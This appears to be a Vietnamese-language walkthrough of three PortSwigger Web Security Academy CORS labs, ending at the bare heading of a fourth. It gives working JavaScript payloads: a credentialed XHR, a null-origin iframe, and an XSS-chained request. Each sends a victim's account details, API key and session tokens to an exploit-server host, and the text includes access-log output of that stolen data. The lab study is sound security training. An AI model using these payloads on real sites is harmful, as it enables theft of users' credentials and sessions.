# 1. CORS vulnerability with basic origin reflection
Ta thấy khi gửi request `GET /accountDetails`, trong response sẽ chứa thông tin đầy đủ về user trong phiên hiện tại. Như vậy ta vào exploit server và cấu hình đoạn code sau:

```
<script>
let xhr = new XMLHttpRequest();
xhr.onload = sendRequest;
xhr.open('GET', 'https://0a9f008704a74bedc06f45ff00f600cd.web-security-academy.net/accountDetails');
xhr.withCredentials = true;
xhr.send();

function sendRequest(){
fetch('https://exploit-0ab7003c04f14b63c07644d50138000b.exploit-server.net/exploit?apiKey='+this.responseText);
}
</script>
```
Đoạn script trên sẽ gửi request đến `/accountDetails`, lấy ra response rồi đặt làm tham số trong request gửi tới exploit server mà ta kiểm soát.

Sau khi click "Deliver to victim", vào Access log ta thấy có một request với tham số apiKey là một object:

![image](https://user-images.githubusercontent.com/103978452/210699785-c2fc9ed4-50fa-4d0c-82cd-3424d39d6f3b.png)

Thực hiện URL decode, rồi lấy giá trị của trường "apikey" để submit, kết quả thành công.

# 2. CORS vulnerability with trusted null origin
Nhận thấy trong request `/accountDetails`, khi đặt `Origin: null` thì response trả về chứa header `Access-Control-Allow-Origin: null`. Như vậy ta có thể exploit bằng cách dùng tag iframe để tự động thiết lập `Origin: null`.

Vào exploi server và cấu hình đoạn code sau:
```
<iframe src="data:text/html,<script>let xhr = new XMLHttpRequest();
xhr.onload = sendRequest;
xhr.open('GET', 'https://0a47008204d3fe7bc0c6c26e00f2002c.web-security-academy.net/accountDetails');
xhr.withCredentials = true;
xhr.send();

function sendRequest(){
document.location='https://exploit-0a400044046dfe6ec0d3c132019600e6.exploit-server.net/?data='+this.responseText;
}
</script>">
```

Do thẻ iframe có thuộc tính `src="data:text/html,....`, Origin sẽ tự động được thiết lập là null và từ đó có thể bypass CORS. Sau khi click "Deliver to victim", vào trong Access log thì ta thấy có request:
```
10.0.4.254      2023-01-06 08:51:25 +0000 "GET /?data={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22n2daOK1lnvFCmG9DwadLa7iTt1vZieUi%22,%20%20%22sessions%22:%20[%20%20%20%20%22OZnSVCGK2EuB1QXu7RplVCP9Osicu5Gg%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
```

Tiến hành URL decode, ta thu được `apikey=n2daOK1lnvFCmG9DwadLa7iTt1vZieUi`. Submit thông tin có được, kết quả thành công.

# 3. CORS vulnerability with trusted insecure protocols
Nhận thấy website có chức năng check stock. Sau khi click nút "Check stock" với một sản phẩm bất kỳ, ta sẽ được chuyển đến URL `http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/?productId=2&storeId=1`. Thử thay đổi `productId=<script>alert(1)</script>` thì thấy câu lệnh alert được thực thi. Như vậy website có lỗ hổng XSS.

Vào BurpRepeater, thay đổi `Origin: http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net` thì trong response trả về có header `Access-Control-Allow-Origin`. Như vậy ta có thể kết hợp XSS để khai thác lỗ hổng CORS, gửi request tới `/accountDetails` và lấy thông tin về.

Vào exploit server và cấu hình đoạn HTML sau:
```
<script>
document.location="http://stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/?productId=<script>let xhr=new XMLHttpRequest();xhr.onreadystatechange=printResponse;xhr.open('GET','https://0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net/accountDetails');xhr.withCredentials=true;xhr.send();function printResponse(){document.location='https://exploit-0a3d00cd035dc84bc05021db016c00db.exploit-server.net/?key='%2Bthis.responseText;}%3C/script>&storeId=1"
</script>
```

Đoạn script đầu tiên sẽ chuyển hướng người dùng tới `stock.0ae0003a03f1c8bdc0062267005100e2.web-security-academy.net` với payload XSS. Đoạn XSS này sau đó tiếp tục gửi request `/accountDetails`, lấy thông tin về và chuyển hướng tới exploit server, trong URL sẽ chứa những data thu thập được.

Sau khi click "Deliver to victim", vào Access log kiểm tra ta thấy có requests chứa dữ liệu Json được gửi đến
![image](https://user-images.githubusercontent.com/103978452/211489774-a4881ba2-d188-4fa7-9c9d-46949cd6cded.png)

Sau khi URL decode, ta thu được `apiKey=IZaEsQwzA4YTgbgUoaW56AWiLa84Zo9K`. Sử dụng dữ liệu thu được để submit, kết quả thành công.

# 4. CORS vulnerability with internal network pivot attackCORS vulnerability with internal network pivot attack
